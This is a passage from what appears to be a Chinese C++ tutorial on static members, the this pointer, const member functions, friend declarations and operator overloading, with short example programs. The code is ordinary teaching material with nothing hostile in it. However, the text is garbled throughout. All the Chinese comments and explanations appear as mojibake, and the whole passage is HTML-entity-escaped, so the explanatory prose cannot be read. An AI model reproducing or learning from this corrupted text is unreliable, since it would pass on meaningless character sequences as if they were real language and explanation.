p1;\n\tp1.m_A &#x3D; 100;\n\tcout &lt;&lt; &quot;p1.m_A &#x3D; &quot; &lt;&lt; p1.m_A &lt;&lt; endl;\n\n\tPerson p2;\n\tp2.m_A &#x3D; 200;\n\tcout &lt;&lt; &quot;p1.m_A &#x3D; &quot; &lt;&lt; p1.m_A &lt;&lt; endl; &#x2F;&#x2F;å…±äº«åŒä¸€ä»½æ•°æ®\n\tcout &lt;&lt; &quot;p2.m_A &#x3D; &quot; &lt;&lt; p2.m_A &lt;&lt; endl;\n\n\t&#x2F;&#x2F;2ã€é€šè¿‡ç±»å\n\tcout &lt;&lt; &quot;m_A &#x3D; &quot; &lt;&lt; Person::m_A &lt;&lt; endl;\n\n\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;m_B &#x3D; &quot; &lt;&lt; Person::m_B &lt;&lt; endl; &#x2F;&#x2F;ç§æœ‰æƒé™è®¿é—®ä¸åˆ°\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç¤ºä¾‹2ï¼šé™æ€æˆå‘˜å‡½æ•°\nclass Person\n&#123;\n\npublic:\n\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å‡½æ•°ç‰¹ç‚¹ï¼š\n\t&#x2F;&#x2F;1 ç¨‹åºå…±äº«ä¸€ä¸ªå‡½æ•°\n\t&#x2F;&#x2F;2 é™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡\n\t\n\tstatic void func()\n\t&#123;\n\t\tcout &lt;&lt; &quot;funcè°ƒç”¨&quot; &lt;&lt; endl;\n\t\tm_A &#x3D; 100;\n\t\t&#x2F;&#x2F;m_B &#x3D; 100; &#x2F;&#x2F;é”™è¯¯ï¼Œä¸å¯ä»¥è®¿é—®éé™æ€æˆå‘˜å˜é‡\n\t&#125;\n\n\tstatic int m_A; &#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡\n\tint m_B; &#x2F;&#x2F; \nprivate:\n\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å‡½æ•°ä¹Ÿæ˜¯æœ‰è®¿é—®æƒé™çš„\n\tstatic void func2()\n\t&#123;\n\t\tcout &lt;&lt; &quot;func2è°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\nint Person::m_A &#x3D; 10;\n\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡ä¸¤ç§è®¿é—®æ–¹å¼\n\n\t&#x2F;&#x2F;1ã€é€šè¿‡å¯¹è±¡\n\tPerson p1;\n\tp1.func();\n\n\t&#x2F;&#x2F;2ã€é€šè¿‡ç±»å\n\tPerson::func();\n\n\n\t&#x2F;&#x2F;Person::func2(); &#x2F;&#x2F;ç§æœ‰æƒé™è®¿é—®ä¸åˆ°\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nC++å¯¹è±¡æ¨¡å‹å’ŒthisæŒ‡é’ˆæˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°åˆ†å¼€å­˜å‚¨åœ¨C++ä¸­ï¼Œç±»å†…çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°åˆ†å¼€å­˜å‚¨\nåªæœ‰éé™æ€æˆå‘˜å˜é‡æ‰å±äºç±»çš„å¯¹è±¡ä¸Š\nclass Person &#123;\npublic:\n\tPerson() &#123;\n\t\tmA &#x3D; 0;\n\t&#125;\n\t&#x2F;&#x2F;éé™æ€æˆå‘˜å˜é‡å å¯¹è±¡ç©ºé—´\n\tint mA;\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡ä¸å å¯¹è±¡ç©ºé—´\n\tstatic int mB; \n\t&#x2F;&#x2F;å‡½æ•°ä¹Ÿä¸å å¯¹è±¡ç©ºé—´ï¼Œæ‰€æœ‰å‡½æ•°å…±äº«ä¸€ä¸ªå‡½æ•°å®ä¾‹\n\tvoid func() &#123;\n\t\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; this-&gt;mA &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å‡½æ•°ä¹Ÿä¸å å¯¹è±¡ç©ºé—´\n\tstatic void sfunc() &#123;\n\t&#125;\n&#125;;\n\nint main() &#123;\n\n\tcout &lt;&lt; sizeof(Person) &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nthisæŒ‡é’ˆæ¦‚å¿µé€šè¿‡4.3.1æˆ‘ä»¬çŸ¥é“åœ¨C++ä¸­æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°æ˜¯åˆ†å¼€å­˜å‚¨çš„\næ¯ä¸€ä¸ªéé™æ€æˆå‘˜å‡½æ•°åªä¼šè¯ç”Ÿä¸€ä»½å‡½æ•°å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šä¸ªåŒç±»å‹çš„å¯¹è±¡ä¼šå…±ç”¨ä¸€å—ä»£ç \né‚£ä¹ˆé—®é¢˜æ˜¯ï¼šè¿™ä¸€å—ä»£ç æ˜¯å¦‚ä½•åŒºåˆ†é‚£ä¸ªå¯¹è±¡è°ƒç”¨è‡ªå·±çš„å‘¢ï¼Ÿ\nc++é€šè¿‡æä¾›ç‰¹æ®Šçš„å¯¹è±¡æŒ‡é’ˆï¼ŒthisæŒ‡é’ˆï¼Œè§£å†³ä¸Šè¿°é—®é¢˜ã€‚thisæŒ‡é’ˆæŒ‡å‘è¢«è°ƒç”¨çš„æˆå‘˜å‡½æ•°æ‰€å±çš„å¯¹è±¡\nthisæŒ‡é’ˆæ˜¯éšå«æ¯ä¸€ä¸ªéé™æ€æˆå‘˜å‡½æ•°å†…çš„ä¸€ç§æŒ‡é’ˆ\nthisæŒ‡é’ˆä¸éœ€è¦å®šä¹‰ï¼Œç›´æ¥ä½¿ç”¨å³å¯\nthisæŒ‡é’ˆçš„ç”¨é€”ï¼š\n\nå½“å½¢å‚å’Œæˆå‘˜å˜é‡åŒåæ—¶ï¼Œå¯ç”¨thisæŒ‡é’ˆæ¥åŒºåˆ†\nåœ¨ç±»çš„éé™æ€æˆå‘˜å‡½æ•°ä¸­è¿”å›å¯¹è±¡æœ¬èº«ï¼Œå¯ä½¿ç”¨return *this\n\nclass Person\n&#123;\npublic:\n\n\tPerson(int age)\n\t&#123;\n\t\t&#x2F;&#x2F;1ã€å½“å½¢å‚å’Œæˆå‘˜å˜é‡åŒåæ—¶ï¼Œå¯ç”¨thisæŒ‡é’ˆæ¥åŒºåˆ†\n\t\tthis-&gt;age &#x3D; age;\n\t&#125;\n\n\tPerson&amp; PersonAddPerson(Person p)\n\t&#123;\n\t\tthis-&gt;age +&#x3D; p.age;\n\t\t&#x2F;&#x2F;è¿”å›å¯¹è±¡æœ¬èº«\n\t\treturn *this;\n\t&#125;\n\n\tint age;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p1(10);\n\tcout &lt;&lt; &quot;p1.age &#x3D; &quot; &lt;&lt; p1.age &lt;&lt; endl;\n\n\tPerson p2(10);\n\tp2.PersonAddPerson(p1).PersonAddPerson(p1).PersonAddPerson(p1);\n\tcout &lt;&lt; &quot;p2.age &#x3D; &quot; &lt;&lt; p2.age &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç©ºæŒ‡é’ˆè®¿é—®æˆå‘˜å‡½æ•°C++ä¸­ç©ºæŒ‡é’ˆä¹Ÿæ˜¯å¯ä»¥è°ƒç”¨æˆå‘˜å‡½æ•°çš„ï¼Œä½†æ˜¯ä¹Ÿè¦æ³¨æ„æœ‰æ²¡æœ‰ç”¨åˆ°thisæŒ‡é’ˆ\nå¦‚æœç”¨åˆ°thisæŒ‡é’ˆï¼Œéœ€è¦åŠ ä»¥åˆ¤æ–­ä¿è¯ä»£ç çš„å¥å£®æ€§\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;ç©ºæŒ‡é’ˆè®¿é—®æˆå‘˜å‡½æ•°\nclass Person &#123;\npublic:\n\n\tvoid ShowClassName() &#123;\n\t\tcout &lt;&lt; &quot;æˆ‘æ˜¯Personç±»!&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid ShowPerson() &#123;\n\t\tif (this &#x3D;&#x3D; NULL) &#123;\n\t\t\treturn;\n\t\t&#125;\n\t\tcout &lt;&lt; mAge &lt;&lt; endl;\n\t&#125;\n\npublic:\n\tint mAge;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson * p &#x3D; NULL;\n\tp-&gt;ShowClassName(); &#x2F;&#x2F;ç©ºæŒ‡é’ˆï¼Œå¯ä»¥è°ƒç”¨æˆå‘˜å‡½æ•°\n\tp-&gt;ShowPerson();  &#x2F;&#x2F;ä½†æ˜¯å¦‚æœæˆå‘˜å‡½æ•°ä¸­ç”¨åˆ°äº†thisæŒ‡é’ˆï¼Œå°±ä¸å¯ä»¥äº†\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nconstä¿®é¥°æˆå‘˜å‡½æ•°å¸¸å‡½æ•°ï¼š\n\næˆå‘˜å‡½æ•°ååŠ conståæˆ‘ä»¬ç§°ä¸ºè¿™ä¸ªå‡½æ•°ä¸ºå¸¸å‡½æ•°\nå¸¸å‡½æ•°å†…ä¸å¯ä»¥ä¿®æ”¹æˆå‘˜å±æ€§\næˆå‘˜å±æ€§å£°æ˜æ—¶åŠ å…³é”®å­—mutableåï¼Œåœ¨å¸¸å‡½æ•°ä¸­ä¾ç„¶å¯ä»¥ä¿®æ”¹\n\nå¸¸å¯¹è±¡ï¼š\n\nå£°æ˜å¯¹è±¡å‰åŠ constç§°è¯¥å¯¹è±¡ä¸ºå¸¸å¯¹è±¡\nå¸¸å¯¹è±¡åªèƒ½è°ƒç”¨å¸¸å‡½æ•°\n\nç¤ºä¾‹ï¼š\nclass Person &#123;\npublic:\n\tPerson() &#123;\n\t\tm_A &#x3D; 0;\n\t\tm_B &#x3D; 0;\n\t&#125;\n\n\t&#x2F;&#x2F;thisæŒ‡é’ˆçš„æœ¬è´¨æ˜¯ä¸€ä¸ªæŒ‡é’ˆå¸¸é‡ï¼ŒæŒ‡é’ˆçš„æŒ‡å‘ä¸å¯ä¿®æ”¹\n\t&#x2F;&#x2F;å¦‚æœæƒ³è®©æŒ‡é’ˆæŒ‡å‘çš„å€¼ä¹Ÿä¸å¯ä»¥ä¿®æ”¹ï¼Œéœ€è¦å£°æ˜å¸¸å‡½æ•°\n\tvoid ShowPerson() const &#123;\n\t\t&#x2F;&#x2F;const Type* const pointer;\n\t\t&#x2F;&#x2F;this &#x3D; NULL; &#x2F;&#x2F;ä¸èƒ½ä¿®æ”¹æŒ‡é’ˆçš„æŒ‡å‘ Person* const this;\n\t\t&#x2F;&#x2F;this-&gt;mA &#x3D; 100; &#x2F;&#x2F;ä½†æ˜¯thisæŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡çš„æ•°æ®æ˜¯å¯ä»¥ä¿®æ”¹çš„\n\n\t\t&#x2F;&#x2F;constä¿®é¥°æˆå‘˜å‡½æ•°ï¼Œè¡¨ç¤ºæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ç©ºé—´çš„æ•°æ®ä¸èƒ½ä¿®æ”¹ï¼Œé™¤äº†mutableä¿®é¥°çš„å˜é‡\n\t\tthis-&gt;m_B &#x3D; 100;\n\t&#125;\n\n\tvoid MyFunc() const &#123;\n\t\t&#x2F;&#x2F;mA &#x3D; 10000;\n\t&#125;\n\npublic:\n\tint m_A;\n\tmutable int m_B; &#x2F;&#x2F;å¯ä¿®æ”¹ å¯å˜çš„\n&#125;;\n\n\n&#x2F;&#x2F;constä¿®é¥°å¯¹è±¡  å¸¸å¯¹è±¡\nvoid test01() &#123;\n\n\tconst Person person; &#x2F;&#x2F;å¸¸é‡å¯¹è±¡  \n\tcout &lt;&lt; person.m_A &lt;&lt; endl;\n\t&#x2F;&#x2F;person.mA &#x3D; 100; &#x2F;&#x2F;å¸¸å¯¹è±¡ä¸èƒ½ä¿®æ”¹æˆå‘˜å˜é‡çš„å€¼,ä½†æ˜¯å¯ä»¥è®¿é—®\n\tperson.m_B &#x3D; 100; &#x2F;&#x2F;ä½†æ˜¯å¸¸å¯¹è±¡å¯ä»¥ä¿®æ”¹mutableä¿®é¥°æˆå‘˜å˜é‡\n\n\t&#x2F;&#x2F;å¸¸å¯¹è±¡è®¿é—®æˆå‘˜å‡½æ•°\n\tperson.MyFunc(); &#x2F;&#x2F;å¸¸å¯¹è±¡ä¸èƒ½è°ƒç”¨constçš„å‡½æ•°\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå‹å…ƒç”Ÿæ´»ä¸­ä½ çš„å®¶æœ‰å®¢å…(Public)ï¼Œæœ‰ä½ çš„å§å®¤(Private)\nå®¢å…æ‰€æœ‰æ¥çš„å®¢äººéƒ½å¯ä»¥è¿›å»ï¼Œä½†æ˜¯ä½ çš„å§å®¤æ˜¯ç§æœ‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰ä½ èƒ½è¿›å»\nä½†æ˜¯å‘¢ï¼Œä½ ä¹Ÿå¯ä»¥å…è®¸ä½ çš„å¥½é—ºèœœå¥½åŸºå‹è¿›å»ã€‚\nåœ¨ç¨‹åºé‡Œï¼Œæœ‰äº›ç§æœ‰å±æ€§ ä¹Ÿæƒ³è®©ç±»å¤–ç‰¹æ®Šçš„ä¸€äº›å‡½æ•°æˆ–è€…ç±»è¿›è¡Œè®¿é—®ï¼Œå°±éœ€è¦ç”¨åˆ°å‹å…ƒçš„æŠ€æœ¯\nå‹å…ƒçš„ç›®çš„å°±æ˜¯è®©ä¸€ä¸ªå‡½æ•°æˆ–è€…ç±» è®¿é—®å¦ä¸€ä¸ªç±»ä¸­ç§æœ‰æˆå‘˜\nå‹å…ƒçš„å…³é”®å­—ä¸º &#x3D;&#x3D;friend&#x3D;&#x3D;\nå‹å…ƒçš„ä¸‰ç§å®ç°\n\nå…¨å±€å‡½æ•°åšå‹å…ƒ\nç±»åšå‹å…ƒ\næˆå‘˜å‡½æ•°åšå‹å…ƒ\n\nå…¨å±€å‡½æ•°åšå‹å…ƒclass Building\n&#123;\n\t&#x2F;&#x2F;å‘Šè¯‰ç¼–è¯‘å™¨ goodGayå…¨å±€å‡½æ•° æ˜¯ Buildingç±»çš„å¥½æœ‹å‹ï¼Œå¯ä»¥è®¿é—®ç±»ä¸­çš„ç§æœ‰å†…å®¹\n\tfriend void goodGay(Building * building);\n\npublic:\n\n\tBuilding()\n\t&#123;\n\t\tthis-&gt;m_SittingRoom &#x3D; &quot;å®¢å…&quot;;\n\t\tthis-&gt;m_BedRoom &#x3D; &quot;å§å®¤&quot;;\n\t&#125;\n\n\npublic:\n\tstring m_SittingRoom; &#x2F;&#x2F;å®¢å…\n\nprivate:\n\tstring m_BedRoom; &#x2F;&#x2F;å§å®¤\n&#125;;\n\n\nvoid goodGay(Building * building)\n&#123;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®ï¼š &quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®ï¼š &quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\n\nvoid test01()\n&#123;\n\tBuilding b;\n\tgoodGay(&amp;b);\n&#125;\n\nint main()&#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\nç±»åšå‹å…ƒclass Building;\nclass goodGay\n&#123;\npublic:\n\n\tgoodGay();\n\tvoid visit();\n\nprivate:\n\tBuilding *building;\n&#125;;\n\n\nclass Building\n&#123;\n\t&#x2F;&#x2F;å‘Šè¯‰ç¼–è¯‘å™¨ goodGayç±»æ˜¯Buildingç±»çš„å¥½æœ‹å‹ï¼Œå¯ä»¥è®¿é—®åˆ°Buildingç±»ä¸­ç§æœ‰å†…å®¹\n\tfriend class goodGay;\n\npublic:\n\tBuilding();\n\npublic:\n\tstring m_SittingRoom; &#x2F;&#x2F;å®¢å…\nprivate:\n\tstring m_BedRoom;&#x2F;&#x2F;å§å®¤\n&#125;;\n\nBuilding::Building()\n&#123;\n\tthis-&gt;m_SittingRoom &#x3D; &quot;å®¢å…&quot;;\n\tthis-&gt;m_BedRoom &#x3D; &quot;å§å®¤&quot;;\n&#125;\n\ngoodGay::goodGay()\n&#123;\n\tbuilding &#x3D; new Building;\n&#125;\n\nvoid goodGay::visit()\n&#123;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\nvoid test01()\n&#123;\n\tgoodGay gg;\n\tgg.visit();\n\n&#125;\n\nint main()&#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\næˆå‘˜å‡½æ•°åšå‹å…ƒclass Building;\nclass goodGay\n&#123;\npublic:\n\n\tgoodGay();\n\tvoid visit(); &#x2F;&#x2F;åªè®©visitå‡½æ•°ä½œä¸ºBuildingçš„å¥½æœ‹å‹ï¼Œå¯ä»¥å‘è®¿é—®Buildingä¸­ç§æœ‰å†…å®¹\n\tvoid visit2(); \n\nprivate:\n\tBuilding *building;\n&#125;;\n\n\nclass Building\n&#123;\n\t&#x2F;&#x2F;å‘Šè¯‰ç¼–è¯‘å™¨  goodGayç±»ä¸­çš„visitæˆå‘˜å‡½æ•° æ˜¯Buildingå¥½æœ‹å‹ï¼Œå¯ä»¥è®¿é—®ç§æœ‰å†…å®¹\n\tfriend void goodGay::visit();\n\npublic:\n\tBuilding();\n\npublic:\n\tstring m_SittingRoom; &#x2F;&#x2F;å®¢å…\nprivate:\n\tstring m_BedRoom;&#x2F;&#x2F;å§å®¤\n&#125;;\n\nBuilding::Building()\n&#123;\n\tthis-&gt;m_SittingRoom &#x3D; &quot;å®¢å…&quot;;\n\tthis-&gt;m_BedRoom &#x3D; &quot;å§å®¤&quot;;\n&#125;\n\ngoodGay::goodGay()\n&#123;\n\tbuilding &#x3D; new Building;\n&#125;\n\nvoid goodGay::visit()\n&#123;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\nvoid goodGay::visit2()\n&#123;\n\tcout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;å¥½åŸºå‹æ­£åœ¨è®¿é—®&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;\n&#125;\n\nvoid test01()\n&#123;\n\tgoodGay  gg;\n\tgg.visit();\n\n&#125;\n\nint main()&#123;\n    \n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\nè¿ç®—ç¬¦é‡è½½è¿ç®—ç¬¦é‡è½½æ¦‚å¿µï¼šå¯¹å·²æœ‰çš„è¿ç®—ç¬¦é‡æ–°è¿›è¡Œå®šä¹‰ï¼Œèµ‹äºˆå…¶å¦ä¸€ç§åŠŸèƒ½ï¼Œä»¥é€‚åº”ä¸åŒçš„æ•°æ®ç±»å‹\nåŠ å·è¿ç®—ç¬¦é‡è½½ä½œç”¨ï¼šå®ç°ä¸¤ä¸ªè‡ªå®šä¹‰æ•°æ®ç±»å‹ç›¸åŠ çš„è¿ç®—\nclass Person &#123;\npublic:\n\tPerson() &#123;&#125;;\n\tPerson(int a, int b)\n\t&#123;\n\t\tthis-&gt;m_A &#x3D; a;\n\t\tthis-&gt;m_B &#x3D; b;\n\t&#125;\n\t&#x2F;&#x2F;æˆå‘˜å‡½æ•°å®ç° + å·è¿ç®—ç¬¦é‡è½½\n\tPerson operator+(const Person&amp; p) &#123;\n\t\tPerson temp;\n\t\ttemp.m_A &#x3D; this-&gt;m_A + p.m_A;\n\t\ttemp.m_B &#x3D; this-&gt;m_B + p.m_B;\n\t\treturn temp;\n\t&#125;\n\n\npublic:\n\tint m_A;\n\tint m_B;\n&#125;;\n\n&#x2F;&#x2F;å…¨å±€å‡½æ•°å®ç° + å·è¿ç®—ç¬¦é‡è½½\n&#x2F;&#x2F;Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;\n&#x2F;&#x2F;\tPerson temp(0, 0);\n&#x2F;&#x2F;\ttemp.m_A &#x3D; p1.m_A + p2.m_A;\n&#x2F;&#x2F;\ttemp.m_B &#x3D; p1.m_B + p2.m_B;\n&#x2F;&#x2F;\treturn temp;\n&#x2F;&#x2F;&#125;\n\n&#x2F;&#x2F;è¿ç®—ç¬¦é‡è½½ å¯ä»¥å‘ç”Ÿå‡½æ•°é‡è½½ \nPerson operator+(const Person&amp; p2, int val)  \n&#123;\n\tPerson temp;\n\ttemp.m_A &#x3D; p2.m_A + val;\n\ttemp.m_B &#x3D; p2.m_B + val;\n\treturn temp;\n&#125;\n\nvoid test() &#123;\n\n\tPerson p1(10, 10);\n\tPerson p2(20, 20);\n\n\t&#x2F;&#x2F;æˆå‘˜å‡½æ•°æ–¹å¼\n\tPerson p3 &#x3D; p2 + p1;  &#x2F;&#x2F;ç›¸å½“äº p2.operaor+(p1)\n\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; p3.m_A &lt;&lt; &quot; mB:&quot; &lt;&lt; p3.m_B &lt;&lt; endl;\n\n\n\tPerson p4 &#x3D; p3 + 10; &#x2F;&#x2F;ç›¸å½“äº operator+(p3,10)\n\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; p4.m_A &lt;&lt; &quot; mB:&quot; &lt;&lt; p4.m_B &lt;&lt; endl;\n\n&#125;\n\nint main() &#123;\n\n\ttest();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“1ï¼šå¯¹äºå†…ç½®çš„æ•°æ®ç±»å‹çš„è¡¨è¾¾å¼çš„çš„è¿ç®—ç¬¦æ˜¯ä¸å¯èƒ½æ”¹å˜çš„\n\n\n\n\n\n\n\n\n\næ€»ç»“2ï¼šä¸è¦æ»¥ç”¨è¿ç®—ç¬¦é‡è½½\nå·¦ç§»è¿ç®—ç¬¦é‡è½½ä½œç”¨ï¼šå¯ä»¥è¾“å‡ºè‡ªå®šä¹‰æ•°æ®ç±»å‹\nclass Person &#123;\n\tfriend ostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p);\n\npublic:\n\n\tPerson(int a, int b)\n\t&#123;\n\t\tthis-&gt;m_A &#x3D; a;\n\t\tthis-&gt;m_B &#x3D; b;\n\t&#125;\n\n\t&#x2F;&#x2F;æˆå‘˜å‡½æ•° å®ç°ä¸äº†  p &lt;&lt; cout ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœ\n\t&#x2F;&#x2F;void operator&lt;&lt;(Person&amp; p)&#123;\n\t&#x2F;&#x2F;&#125;\n\nprivate:\n\tint m_A;\n\tint m_B;\n&#125;;\n\n&#x2F;&#x2F;å…¨å±€å‡½æ•°å®ç°å·¦ç§»é‡è½½\n&#x2F;&#x2F;ostreamå¯¹è±¡åªèƒ½æœ‰ä¸€ä¸ª\nostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;\n\tout &lt;&lt; &quot;a:&quot; &lt;&lt; p.m_A &lt;&lt; &quot; b:&quot; &lt;&lt; p.m_B;\n\treturn out;\n&#125;\n\nvoid test() &#123;\n\n\tPerson p1(10, 20);\n\n\tcout &lt;&lt; p1 &lt;&lt; &quot;hello world&quot; &lt;&lt; endl; &#x2F;&#x2F;é“¾å¼ç¼–ç¨‹\n&#125;\n\nint main() &#123;\n\n\ttest();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼šé‡è½½å·¦ç§»è¿ç®—ç¬¦é…åˆå‹å…ƒå¯ä»¥å®ç°è¾“å‡ºè‡ªå®šä¹‰æ•°æ®ç±»å‹\né€’å¢è¿ç®—ç¬¦é‡è½½ä½œç”¨ï¼š é€šè¿‡é‡è½½é€’å¢è¿ç®—ç¬¦ï¼Œå®ç°è‡ªå·±çš„æ•´å‹æ•°æ®\nclass MyInteger &#123;\n\n\tfriend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint);\n\npublic:\n\tMyInteger() &#123;\n\t\tm_Num &#x3D; 0;\n\t&#125;\n\t&#x2F;&#x2F;å‰ç½®++\n\tMyInteger&amp; operator++() &#123;\n\t\t&#x2F;&#x2F;å…ˆ++\n\t\tm_Num++;\n\t\t&#x2F;&#x2F;å†è¿”å›\n\t\treturn *this;\n\t&#125;\n\n\t&#x2F;&#x2F;åç½®++\n\tMyInteger operator++(int) &#123;\n\t\t&#x2F;&#x2F;å…ˆè¿”å›\n\t\tMyInteger temp &#x3D; *this; &#x2F;&#x2F;è®°å½•å½“å‰æœ¬èº«çš„å€¼ï¼Œç„¶åè®©æœ¬èº«çš„å€¼åŠ 1ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯ä»¥å‰çš„å€¼ï¼Œè¾¾åˆ°å…ˆè¿”å›å++ï¼›\n\t\tm_Num++;\n\t\treturn temp;\n\t&#125;\n\nprivate:\n\tint m_Num;\n&#125;;\n\n\nostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;\n\tout &lt;&lt; myint.m_Num;\n\treturn out;\n&#125;\n\n\n&#x2F;&#x2F;å‰ç½®++ å…ˆ++ å†è¿”å›\nvoid test01() &#123;\n\tMyInteger myInt;\n\tcout &lt;&lt; ++myInt &lt;&lt; endl;\n\tcout &lt;&lt; myInt &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;åç½®++ å…ˆè¿”å› å†++\nvoid test02() &#123;\n\n\tMyInteger myInt;\n\tcout &lt;&lt; myInt++ &lt;&lt; endl;\n\tcout &lt;&lt; myInt &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\t&#x2F;&#x2F;test02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼š å‰ç½®é€’å¢è¿”å›å¼•ç”¨ï¼Œåç½®é€’å¢è¿”å›å€¼\nèµ‹å€¼è¿ç®—ç¬¦é‡è½½c++ç¼–è¯‘å™¨è‡³å°‘ç»™ä¸€ä¸ªç±»æ·»åŠ 4ä¸ªå‡½æ•°\n\né»˜è®¤æ„é€ å‡½æ•°(æ— å‚ï¼Œå‡½æ•°ä½“ä¸ºç©º)\né»˜è®¤ææ„å‡½æ•°(æ— å‚ï¼Œå‡½æ•°ä½“ä¸ºç©º)\né»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼Œå¯¹å±æ€§è¿›è¡Œå€¼æ‹·è´\nèµ‹å€¼è¿ç®—ç¬¦ operator&#x3D;, å¯¹å±æ€§è¿›è¡Œå€¼æ‹·è´\n\nå¦‚æœç±»ä¸­æœ‰å±æ€§æŒ‡å‘å †åŒºï¼Œåšèµ‹å€¼æ“ä½œæ—¶ä¹Ÿä¼šå‡ºç°æ·±æµ…æ‹·è´é—®é¢˜\nç¤ºä¾‹ï¼š\nclass Person\n&#123;\npublic:\n\n\tPerson(int age)\n\t&#123;\n\t\t&#x2F;&#x2F;å°†å¹´é¾„æ•°æ®å¼€è¾Ÿåˆ°å †åŒº\n\t\tm_Age &#x3D; new int(age);\n\t&#125;\n\n\t&#x2F;&#x2F;é‡è½½èµ‹å€¼è¿ç®—ç¬¦ \n\tPerson&amp; operator&#x3D;(Person &amp;p)\n\t&#123;\n\t\tif (m_Age !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_Age;\n\t\t\tm_Age &#x3D; NULL;\n\t\t&#125;\n\t\t&#x2F;&#x2F;ç¼–è¯‘å™¨æä¾›çš„ä»£ç æ˜¯æµ…æ‹·è´\n\t\t&#x2F;&#x2F;m_Age &#x3D; p.m_Age;\n\n\t\t&#x2F;&#x2F;æä¾›æ·±æ‹·è´ è§£å†³æµ…æ‹·è´çš„é—®é¢˜\n\t\tm_Age &#x3D; new int(*p.m_Age);\n\n\t\t&#x2F;&#x2F;è¿”å›è‡ªèº«\n\t\treturn *this;\n\t&#125;\n\n\n\t~Person()\n\t&#123;\n\t\tif (m_Age !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_Age;\n\t\t\tm_Age &#x3D; NULL;\n\t\t&#125;\n\t&#125;\n\n\t&#x2F;&#x2F;å¹´é¾„çš„æŒ‡é’ˆ\n\tint *m_Age;\n\n&#125;;\n\n\nvoid test01()\n&#123;\n\tPerson p1(18);\n\n\tPerson p2(20);\n\n\tPerson p3(30);\n\n\tp3 &#x3D; p2 &#x3D; p1; 